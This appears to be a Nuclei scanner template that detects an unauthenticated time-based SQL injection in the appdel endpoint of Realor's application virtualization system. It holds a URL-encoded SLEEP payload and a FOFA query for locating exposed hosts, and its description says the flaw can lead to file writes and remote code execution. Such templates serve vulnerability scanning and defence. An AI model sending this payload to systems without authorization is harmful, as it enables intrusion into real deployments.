id: realor-appdel-sqli

info:
  name: 瑞友天翼应用虚拟化系统 appdel - sqli
  author: leadlife
  severity: high
  description: Realor Application Virtualization System's /Home/Controller/AdminController contains two interfaces, appsave and appdel, which do not require authentication and are vulnerable to SQL injection. Unauthorized attackers can exploit this vulnerability to obtain sensitive information. As the default configuration does not restrict the MySQL write file path through secure_file_priv, attackers can exploit this vulnerability to read and write any local file, thereby executing arbitrary code remotely.
  reference:
    - https://mp.weixin.qq.com/s/S8I2SIqzl_npSjWIqtru2Q
  metadata:
    verified: true
    fofa-query: app="REALOR-天翼应用虚拟化系统"
    tips: sqli maybe to rce
  tags: realor,sqli,rce

variables:
  num: "999999999"
  filename: "{{rand_base(5)}}.php"

http:
  - raw:
      - |
        @timeout: 15s
        GET /hmrao.php?s=/Admin/appdel&list=1111111%27%29%29%20AND%20%28SELECT%206312%20FROM%20%28SELECT%28SLEEP%285%29%29%29coHe%29%23 HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 404
          - duration >= 5 && duration < 9
        condition: and

